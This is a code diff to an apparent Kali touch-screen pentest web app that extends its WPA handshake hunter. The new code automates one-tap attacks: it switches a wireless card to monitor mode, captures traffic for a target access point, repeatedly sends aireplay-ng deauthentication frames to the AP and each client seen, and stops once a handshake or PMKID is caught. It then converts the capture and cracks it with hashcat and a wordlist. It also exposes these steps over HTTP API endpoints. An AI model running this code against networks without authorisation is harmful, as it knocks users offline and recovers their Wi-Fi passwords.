@@ -778,6 +778,27 @@ TERM = TermManager()
 RECON_DIR = "/tmp/recon"
 
 
+def hcx_hash_counts(path):
+    """(pairs, pmkid) crackable hashes in an hcxpcapngtool 22000 file.
+
+    Each hash line starts with its type -- 'WPA*' = WPA-EAPOL pair,
+    'PMKID*' = PMKID -- so the file on disk is the version-proof truth of
+    whether a capture is crackable (output banners change between
+    hcxpcapngtool releases and are not a safe detection source)."""
+    pairs = pmkid = 0
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as f:
+            for line in f:
+                l = line.strip()
+                if l.startswith("WPA"):
+                    pairs += 1
+                elif l.startswith("PMKID"):
+                    pmkid += 1
+    except OSError:
+        pass
+    return pairs, pmkid
+
+
 def parse_recon_csv(path):
     """Parse airodump-ng CSV into {aps, clients} (PineAP-recon style)."""
     aps, clients = [], []
@@ -1000,7 +1021,15 @@ def _safe(name):
 
 class HandshakeManager:
     """Targeted handshake hunter: airodump-ng to /tmp/hs, convert with
-    hcxpcapngtool to hashcat-22000, crack with hashcat + rockyou."""
+    hcxpcapngtool to hashcat-22000, crack with hashcat + rockyou.
+
+    With autodeauth on (default in the UI), HUNT is one tap: it brings the
+    card to monitor, catches the target's channel, captures pcap+csv and
+    pokes the AP (broadcast + each associated client seen in the live CSV)
+    every few seconds until a 4-way handshake or PMKID lands, then stops
+    jamming and converts + auto-cracks what it caught."""
+
+    POKE_INTERVAL = 6.0
 
     def __init__(self):
         self.proc = None
@@ -1009,6 +1038,12 @@ class HandshakeManager:
         self.base = None
         self.channel = None
         self.autocrack_pid = None
+        self.hs_count = 0
+        self.pmkid = 0
+        self.hs_at = 0.0
+        self.autodeauth = False
+        self.pokes = 0
+        self._deauths = []
 
     def running(self):
         return self.proc is not None and self.proc.poll() is None
@@ -1016,7 +1051,17 @@ class HandshakeManager:
     def iface_for(self):
         return RECON.available_iface()
 
-    def start(self, bssid, essid="", channel=None):
+    def _monitor(self, iface):
+        for a in (["ip", "link", "set", iface, "down"],
+                  ["iw", "dev", iface, "set", "type", "monitor"],
+                  ["ip", "link", "set", iface, "up"]):
+            subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        return subprocess.run(["iw", "dev", iface, "info"],
+                              stdout=subprocess.DEVNULL,
+                              stderr=subprocess.DEVNULL).returncode == 0
+
+    def start(self, bssid, essid="", channel=None, autodeauth=False):
         if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
             return False, "bad BSSID"
         iface = self.iface_for()
@@ -1024,6 +1069,8 @@ class HandshakeManager:
             return False, "no wireless card" + RECON.usb_hint()
         RECON.stop()
         self.stop(crack=False)
+        if not self._monitor(iface):
+            return False, "could not bring %s to monitor mode" % iface
         try:
             os.makedirs(HS_DIR, exist_ok=True)
         except OSError:
@@ -1032,14 +1079,23 @@ class HandshakeManager:
         self.base = base
         self.target = bssid.upper()
         self.channel = channel
+        self.hs_count = 0
+        self.pmkid = 0
+        self.hs_at = 0.0
+        self.autodeauth = bool(autodeauth)
+        self.pokes = 0
+        self._deauths = []
         cmd = ["sudo", "-n", "airodump-ng"]
         if channel:
             cmd += ["-c", str(channel)]
-        cmd += ["--bssid", bssid, "-w", base, "--output-format", "pcap", "--write-interval", "2", iface]
+        cmd += ["--bssid", bssid, "-w", base,
+                "--output-format", "pcap,csv", "--write-interval", "2", iface]
         log = open(HS_DIR + "/hs.log", "wb")
         self.proc = subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT)
         self.iface = iface
         self.autocrack_pid = None
+        if self.autodeauth:
+            threading.Thread(target=self._poke_loop, daemon=True).start()
         threading.Thread(target=self._autocrack_watch, daemon=True).start()
         return True, os.path.basename(base)
 
@@ -1054,6 +1110,7 @@ class HandshakeManager:
                 except OSError:
                     pass
             self.proc = None
+        self._clear_deauths()
         if crack:
             if HASHCAT and HASHCAT.poll() is None:
                 try:
@@ -1073,6 +1130,97 @@ class HandshakeManager:
                         self.autocrack_pid.kill()
                     except OSError:
                         pass
+
+    # -- deauth ----------------------------------------------------------
+
+    def _target_clients(self):
+        """Clients currently associated with the target, from the live
+        airodump CSV (so pokes hit real stations, not just broadcast)."""
+        if not self.base or not self.target:
+            return []
+        cands = sorted(glob.glob(self.base + "-*.csv"),
+                       key=os.path.getmtime, reverse=True)
+        if not cands:
+            return []
+        try:
+            d = parse_recon_csv(cands[0])
+        except Exception:
+            return []
+        out = []
+        for c in d.get("clients", []):
+            if c.get("bssid", "").upper() == self.target and c.get("station"):
+                out.append(c["station"])
+                if len(out) >= 6:
+                    break
+        return out
+
+    def _clear_deauths(self):
+        for p in list(self._deauths):
+            if p is not None and p.poll() is None:
+                try:
+                    p.terminate()
+                    p.wait(3)
+                except (subprocess.TimeoutExpired, OSError):
+                    try:
+                        p.kill()
+                    except OSError:
+                        pass
+        self._deauths = []
+
+    def poke(self):
+        """One deauth round: broadcast + every client seen for the target."""
+        iface = self.iface or "toolwlan0"
+        if not self.target:
+            return 0
+        self._clear_deauths()
+        cmds = [["sudo", "-n", "aireplay-ng", "-0", "2", "--ignore-negative-one",
+                 "-a", self.target, iface]]
+        for c in self._target_clients():
+            cmds.append(["sudo", "-n", "aireplay-ng", "-0", "2",
+                         "--ignore-negative-one", "-a", self.target, "-c", c, iface])
+        spawned = 0
+        for cmd in cmds:
+            try:
+                p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                     stderr=subprocess.DEVNULL)
+                self._deauths.append(p)
+                spawned += 1
+            except OSError:
+                pass
+        self.pokes += 1
+        return spawned
+
+    def _poke_loop(self):
+        try:
+            while self.running():
+                if self.hs_count > 0 or self.pmkid > 0:
+                    break
+                self.poke()
+                step = 0.15
+                for _ in range(int(self.POKE_INTERVAL / step)):
+                    if not self.running() or self.hs_count > 0 or self.pmkid > 0:
+                        return
+                    time.sleep(step)
+        finally:
+            self._clear_deauths()
+
+    def deauth(self, bssid, client=None, count=2):
+        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
+            return False
+        iface = self.iface_for() or self.iface or "toolwlan0"
+        self._clear_deauths()
+        cmd = ["sudo", "-n", "aireplay-ng", "-0", str(count),
+               "--ignore-negative-one", "-a", bssid]
+        if client:
+            cmd += ["-c", client]
+        cmd += [iface]
+        try:
+            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL)
+            self._deauths.append(p)
+        except OSError:
+            return False
+        return True
 
     def _autocrack_watch(self):
         """While capturing, watch the pcap for the first handshake/PMKID and,
@@ -1103,9 +1251,17 @@ class HandshakeManager:
                 except (OSError, subprocess.TimeoutExpired):
                     continue
                 txt = (r.stdout or "") + "\n" + (r.stderr or "")
-                n_hs = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
-                    + txt.count("PMKID") + txt.count("PMKID-EAPOL")
-                if n_hs <= last_hs:
+                n_hs, n_pmkid = hcx_hash_counts(hash_out)
+                if n_hs + n_pmkid == 0:
+                    n_hs = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway")
+                    n_pmkid = txt.count("PMKID-EAPOL")
+                if n_hs > 0 and self.hs_count == 0 and not self.hs_at:
+                    self.hs_at = time.time()
+                if n_hs > self.hs_count:
+                    self.hs_count = n_hs
+                if n_pmkid > self.pmkid:
+                    self.pmkid = n_pmkid
+                if n_hs + n_pmkid <= last_hs:
                     continue
                 last_hs = n_hs
                 if not os.path.isfile(hash_out) or os.path.getsize(hash_out) == 0:
@@ -1173,10 +1329,13 @@ class HandshakeManager:
             try:
                 r = subprocess.run(["hcxpcapngtool", "-o", hash_file, cap],
                                    capture_output=True, text=True, timeout=60)
-                out_txt = (r.stdout or "") + "\n" + (r.stderr or "")
-                info["handshakes"] = out_txt.count("4-WAY HANDSHAKE") + out_txt.count("Fourway")
-                info["handshakes"] += out_txt.count("4-WAY-HANDSHAKE") * 0
-                info["pmkid"] = out_txt.count("PMKID")
+                n_hs, n_pmkid = hcx_hash_counts(hash_file)
+                if n_hs + n_pmkid == 0:
+                    out_txt = (r.stdout or "") + "\n" + (r.stderr or "")
+                    n_hs = out_txt.count("4-WAY HANDSHAKE") + out_txt.count("Fourway")
+                    n_pmkid = out_txt.count("PMKID-EAPOL")
+                info["handshakes"] = n_hs
+                info["pmkid"] = n_pmkid
             except (OSError, subprocess.TimeoutExpired):
                 pass
             info["hash"] = os.path.exists(hash_file) and os.path.getsize(hash_file) or 0
@@ -2317,9 +2476,11 @@ class AutoPentest:
                 try:
                     r = subprocess.run(["hcxpcapngtool", "-o", hsh, cap],
                                        capture_output=True, text=True, timeout=60)
-                    txt = (r.stdout or "") + "\n" + (r.stderr or "")
-                    n = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
-                        + txt.count("PMKID") + txt.count("PMKID-EAPOL")
+                    n, _ = hcx_hash_counts(hsh)
+                    if n == 0:
+                        txt = (r.stdout or "") + "\n" + (r.stderr or "")
+                        n = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
+                            + txt.count("PMKID-EAPOL")
                 except (OSError, subprocess.TimeoutExpired):
                     n = 0
                 if n > last_hs:
@@ -2533,7 +2694,7 @@ OTA_REPO = "https://github.com/darkLabz001/kali-touch-ui.git"
 OTA_BRANCH = "main"
 OTA_DIR = "/opt/kali-touch-ui"
 OTA_LOG = "/tmp/ota.log"
-APP_VERSION = "1.4.1"
+APP_VERSION = "1.4.2"
 _ota_busy = False
 _ota_store_changed = False
 _ota_lock = threading.Lock()
@@ -2820,6 +2981,12 @@ class Handler(BaseHTTPRequestHandler):
                 "captures": len(glob.glob(HS_DIR + "/*.cap")),
                 "cracking": (HASHCAT is not None and HASHCAT.poll() is None),
                 "autocrack": HS.autocrack_state(),
+                "handshakes": HS.hs_count,
+                "pmkid": HS.pmkid,
+                "poke": bool(HS.autodeauth),
+                "pokes": HS.pokes,
+                "cracked": HS.cracked(os.path.basename(HS.base))
+                           if HS.base else None,
             }).encode())
         elif path == "/api/hs/captures":
             self._send(200, json.dumps({"captures": HS.captures()}).encode())
@@ -2934,7 +3101,8 @@ class Handler(BaseHTTPRequestHandler):
             ok = RECON.deauth(body.get("bssid", ""), body.get("client") or None, body.get("iface") or None)
             self._send(200 if ok else 400, json.dumps({"ok": ok}).encode())
         elif path == "/api/hs/start":
-            ok, msg = HS.start(body.get("bssid", ""), body.get("essid", ""), body.get("channel"))
+            ok, msg = HS.start(body.get("bssid", ""), body.get("essid", ""),
+                               body.get("channel"), bool(body.get("autodeauth")))
             self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
         elif path == "/api/hs/stop":
             HS.stop()
